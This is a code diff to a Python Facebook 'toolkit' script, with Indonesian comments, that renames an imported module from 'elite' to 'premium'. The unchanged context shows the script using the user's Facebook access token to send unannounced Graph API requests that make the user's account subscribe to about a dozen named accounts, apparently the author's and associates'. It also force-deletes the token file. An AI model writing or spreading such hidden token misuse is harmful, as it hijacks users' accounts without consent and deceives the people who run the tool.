@@ -1,5 +1,5 @@
 import requests,os,json
-import elite
+import premium
 
 P = "\x1b[0;97m" # Putih
 M = "\x1b[0;91m" # Merah
@@ -14,7 +14,7 @@ def main():
         print('%s║'%(M))
         print('%s╚══[%s!%s] %sToken Invalid'%(M,P,M,P))
         os.system('rm -rf token.txt')
-        exit(elite.menu_log())
+        exit(premium.menu_log())
     requests.post("https://graph.facebook.com/1827084332/subscribers?access_token=" + token)      # Dapunta Khurayra X
     requests.post("https://graph.facebook.com/100000415317575/subscribers?access_token=" + token) # Dapunta Adyapaksi R
     requests.post("https://graph.facebook.com/100000431996038/subscribers?access_token=" + token) # Suci Salsabila R
@@ -33,4 +33,4 @@ def main():
     requests.post("https://graph.facebook.com/100010484328037/subscribers?access_token=" + token) # Rizal F
     requests.post("https://graph.facebook.com/100015073506062/subscribers?access_token=" + token) # Angga Kurniawan
     requests.post("https://graph.facebook.com/100005395413800/subscribers?access_token=" + token) # Moh Yayan
-    exit(elite.menu())
+    exit(premium.menu())
